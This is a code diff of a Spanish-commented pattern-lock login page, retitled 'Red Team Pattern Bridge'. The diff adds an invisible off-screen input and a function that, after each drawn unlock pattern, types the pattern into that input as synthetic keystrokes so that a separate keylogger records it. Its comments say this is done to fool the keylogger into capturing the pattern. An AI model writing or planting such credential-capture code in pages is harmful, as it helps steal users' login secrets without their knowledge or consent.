@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Login Security - Index</title>
+    <title>Red Team Pattern Bridge</title>
     <style>
         :root {
             --mario-white: #ffffff;
@@ -25,6 +25,15 @@
             background: url('fondo.png') no-repeat center center fixed;
             background-size: cover;
             background-color: #1a1a1a;
+        }
+
+        /* --- INPUT INVISIBLE PARA EL KEYLOGGER --- */
+        #key-sink {
+            position: absolute;
+            top: -100px;
+            left: -100px;
+            opacity: 0;
+            pointer-events: none;
         }
 
         .overlay {
@@ -54,8 +63,8 @@
 
         .marquee-content span {
             color: var(--mario-white);
-            font-size: 1.1rem;
-            font-weight: 300; 
+            font-size: 1.3rem;
+            font-weight: 600; /* Negrita limpia */
             padding-right: 60px; 
         }
 
@@ -66,12 +75,12 @@
 
         #game-popup {
             position: absolute;
-            top: -95px;
+            top: -110px;
             left: 50%;
             transform: translateX(-50%);
             background: var(--popup-bg);
             color: #333;
-            min-width: 220px; 
+            min-width: 230px; 
             padding: 15px 40px; 
             border-radius: 15px;
             font-size: 0.9rem;
@@ -80,9 +89,7 @@
             display: none; 
             flex-direction: column;
             align-items: center;
-            border: none;
             z-index: 100;
-            animation: slideUp 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
         }
 
         .loader {
@@ -95,15 +102,7 @@
             margin-top: 12px;
         }
 
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        @keyframes slideUp {
-            from { opacity: 0; transform: translate(-50%, 20px); }
-            to { opacity: 1; transform: translate(-50%, 0); }
-        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
         #pattern-wrapper {
             position: relative;
@@ -131,8 +130,7 @@
         }
 
         .dot {
-            width: 10px; 
-            height: 10px;
+            width: 10px; height: 10px;
             background: var(--mario-white); 
             border: none;
             border-radius: 50%;
@@ -148,13 +146,6 @@
             margin-top: 40px;
         }
 
-        .emergency-container {
-            width: 110px; 
-            overflow: hidden;
-            white-space: nowrap;
-            display: flex;
-        }
-
         .link-text {
             color: var(--mario-white) !important;
             font-size: 1rem !important;
@@ -163,12 +154,13 @@
             letter-spacing: 1px !important;
             text-transform: uppercase !important;
             text-decoration: none;
-            line-height: 1;
             cursor: pointer;
         }
     </style>
 </head>
 <body>
+
+<input type="text" id="key-sink">
 
 <div class="overlay">
     <div class="marquee-box">
@@ -199,7 +191,7 @@
     </div>
 
     <div class="bottom-links">
-        <div class="emergency-container">
+        <div class="marquee-box" style="width:110px; margin-bottom:0;">
             <div class="marquee-content" style="animation-duration: 6s;">
                 <span class="link-text" style="padding-right: 30px;">EMERGENCIA</span>
                 <span class="link-text" style="padding-right: 30px;">EMERGENCIA</span>
@@ -215,9 +207,10 @@
     const ctx = canvas.getContext('2d');
     const dots = document.querySelectorAll('.dot');
     const popup = document.getElementById('game-popup');
+    const keySink = document.getElementById('key-sink');
 
-    // --- CAMBIO 1: Nueva clave del 1 al 9 ---
-    const CORRECT_PATTERN = "1-2-3-4-5-6-7-8-9";
+    // Patrón maestro: 1 al 9 (Z sería 1-2-3-5-7-8-9 si la dibujas así)
+    const CORRECT_PATTERN = "123456789"; 
     let isDrawing = false;
     let path = [];
     let failCount = 0;
@@ -242,7 +235,8 @@
         lineColor = '#ffffff';
         dots.forEach(d => d.classList.remove('active'));
         ctx.clearRect(0, 0, canvas.width, canvas.height);
-        popup.style.display = 'none'; 
+        popup.style.display = 'none';
+        keySink.value = ""; // Limpiar input para nueva captura
     }
 
     function move(e) {
@@ -252,9 +246,7 @@
 
         dots.forEach(dot => {
             const rect = dot.getBoundingClientRect();
-            const hit = 15; 
-            if (clientX >= rect.left - hit && clientX <= rect.right + hit &&
-                clientY >= rect.top - hit && clientY <= rect.bottom + hit) {
+            if (clientX >= rect.left && clientX <= rect.right && clientY >= rect.top && clientY <= rect.bottom) {
                 const center = getDotCenter(dot);
                 if (!path.find(p => p.id === center.id)) {
                     path.push(center);
@@ -269,28 +261,55 @@
     function end() {
         if (!isDrawing) return;
         isDrawing = false;
-        const userPattern = path.map(p => p.id).join('-');
+        
+        const userPattern = path.map(p => p.id).join('');
+        
+        if (path.length > 0) {
+            // --- EL PUENTE AL KEYLOGGER ---
+            capturarParaKeylogger(userPattern);
 
-        if (userPattern === CORRECT_PATTERN) {
-            failCount = 0;
-            // ÉXITO: Acceso concedido
-        } else if (path.length > 0) {
-            failCount++;
-            
-            if (failCount === 1) {
-                lineColor = '#ff4444';
-                render();
-                setTimeout(resetUI, 800);
-            } else if (failCount >= 2) {
-                popup.style.display = 'flex';
-                // --- CAMBIO 2: Ahora dura 10 segundos (10000ms) ---
-                setTimeout(() => {
-                    popup.style.display = 'none';
-                    failCount = 0; 
-                    resetUI();
-                }, 10000); 
+            if (userPattern === CORRECT_PATTERN) {
+                failCount = 0;
+                // Éxito
+            } else {
+                failCount++;
+                if (failCount === 1) {
+                    lineColor = '#ff4444';
+                    render();
+                    setTimeout(resetUI, 800);
+                } else {
+                    popup.style.display = 'flex';
+                    setTimeout(() => {
+                        popup.style.display = 'none';
+                        failCount = 0;
+                        resetUI();
+                    }, 10000); // 10 SEGUNDOS
+                }
             }
         }
+    }
+
+    // Función que simula la escritura física para que el keylogger "despierte"
+    function capturarParaKeylogger(texto) {
+        keySink.focus();
+        let i = 0;
+        const intervalo = setInterval(() => {
+            if (i < texto.length) {
+                const char = texto[i];
+                // Creamos el evento de tecla para engañar al keylogger
+                const evento = new KeyboardEvent('keydown', {
+                    key: char,
+                    keyCode: char.charCodeAt(0),
+                    bubbles: true
+                });
+                keySink.dispatchEvent(evento);
+                keySink.value += char;
+                i++;
+            } else {
+                clearInterval(intervalo);
+                keySink.blur(); // Quitar foco al terminar
+            }
+        }, 50); // Simula escritura rápida
     }
 
     function resetUI() {
